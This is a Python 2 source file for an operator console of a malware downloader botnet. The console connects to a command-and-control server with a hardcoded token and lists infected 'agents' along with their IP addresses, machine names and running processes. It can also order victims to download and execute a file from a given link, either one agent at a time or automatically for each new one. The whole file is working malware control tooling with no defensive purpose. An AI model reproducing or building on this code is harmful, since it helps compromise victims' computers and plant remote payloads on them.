import sys
import json
import os
import requests
import urllib2
from prettytable import PrettyTable

token = "woSE0g35K32yoGlHmR2miqJjoOErE30GvWcVsfAOcSeK7Fn3hvfoXtPdsg2PucGK"
server = ""
bConnect = False

def PrintDesc():
	os.system('cls')
	print "	 _____ _            ____                _           _         "
	print "	|_   _|_|___ _ _   |    \ ___ _ _ _ ___| |___ ___ _| |___ ___ "
	print "	  | | | |   | | |  |  |  | . | | | |   | | . | .'| . | -_|  _|"
	print "	  |_| |_|_|_|_  |  |____/|___|_____|_|_|_|___|__,|___|___|_|  "
	print "	            |___|                                             "
	print "	                         Alphal version - (c) Elvis           "
	print "\n"

def PrintHelp():
	print "help \t\t\t\t: show help menu"
	print "clear\t\t\t\t: clear the screen"
	print "connect <C&C>\t\t\t: connect to C&C server"
	print "listAgent\t\t\t: List all agent"
	print "info <agent id>\t\t\t: Show info of client by ID"
	print "delete <agent id>\t\t: Delete an agent"
	print "setDownload <id> <link> <path>\t: Set agent download link, save to path then execute"
	print "autoDownloadOn <link> <path>\t: Turn on auto download when a new client is connected"
	print "autoDownloadOff\t\t\t: Turn off auto download"
	print "\n"
	return

if __name__ == '__main__':
	PrintDesc()
	
	while True:
		cmd = raw_input(">>>").split(" ")
		print ""
		try:
			if cmd[0] == "help":
				PrintHelp()
				
			elif cmd[0] == "connect":
				if len(cmd) != 2:
					print "connect required 1 params\n"
				else:
					if bConnect:
						print "Already connected! If you want to re-connect, please run again!\n"
					else:
						URL = "%s/api?token=%s&cmd=connect" % (cmd[1].strip(), token)
						print "Connecting to %s with token %s" % (cmd[1].strip(), token)
						r = requests.get(URL)
						if r.text == "Valid token":
							server = cmd[1]
							bConnect = True
							print "Connected!\n"
						else:
							print "Invalid token\n"
						
			elif cmd[0] == "listAgent":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 1:
						print "listAgent don't require any params\n"
					else:
						URL = "%s/api?token=%s&cmd=listAgent" % (server, token)
						r = requests.get(URL)
						data = r.json()
						print "#Setting"
						print "Auto download\t\t: %r" % data['Auto Download']
						print "Auto download path\t: %s" % data['Auto download Path']
						print "Auto download link\t: %s\n" % data['Auto download Link']
						print "#Agent list"
						t = PrettyTable(['ID', 'IP Address', 'Name', 'Last Connected'])
						for currentAgent in data['Agent']:
							t.add_row([currentAgent['ID'], currentAgent['IP Address'], currentAgent['Computer Info'], currentAgent['Last Connected']])
						print t
						print ""
						
			elif cmd[0] == "info":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 2:
						print "info required 1 params\n"
					else:
						URL = "%s/api?token=%s&cmd=info&id=%s" % (server, token, cmd[1])
						r = requests.get(URL)
						if r.text != "Bad ID":
							data = r.json()
							t = PrettyTable(['ID', 'IP Address', 'Name', 'Last Connected'])
							t.add_row([data['ID'], data['IP Address'], data['Computer Info'], data['Last Connected']])
							print "#Information"
							print t
							print ""
							
							t = PrettyTable(['Process'])
							for process in data['Process List']:
								t.add_row([process])
							print "#Process List"
							print t
							print ""
						else:
							print "Bad ID!\n"
						
			elif cmd[0] == "delete":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 2:
						print "delete require 1 param\n"
					else:
						URL = "%s/api?token=%s&cmd=delete&id=%s" % (server, token, cmd[1])
						r = requests.get(URL)
						print ""
						
			elif cmd[0] == "setDownload":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 4:
						print "setDownload require 3 params\n"
					else:
						URL = "%s/api?token=%s&cmd=setDownload&id=%s&downloadLink=%s&savedPath=%s" % (server, token, cmd[1], cmd[2].strip(), cmd[3].strip())
						r = requests.get(URL)
						print ""
						
			elif cmd[0] == "autoDownloadOn":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 3:
						print "autoDownloadOn require 2 param\n"
					else:
						URL = "%s/api?token=%s&cmd=autoDownloadOn&downloadLink=%s&savedPath=%s" % (server, token, cmd[1].strip(), cmd[2].strip())
						r = requests.get(URL)
						print ""
						
			elif cmd[0] == "autoDownloadOff":
				if bConnect == False:
					print "You have to connect first!\n"
				else:
					if len(cmd) != 1:
						print "autoDownloadOff don't require any params\n"
					else:
						URL = "%s/api?token=%s&cmd=autoDownloadOff" % (server, token)
						r = requests.get(URL)
						print ""
						
			elif cmd[0] == "clear":
				PrintDesc()
			else:
				print "unknown command. Use help command for more information\n"
		
		except Exception as e:
			print "An error has been occurd\n"
			print(e)
			print ""
			pass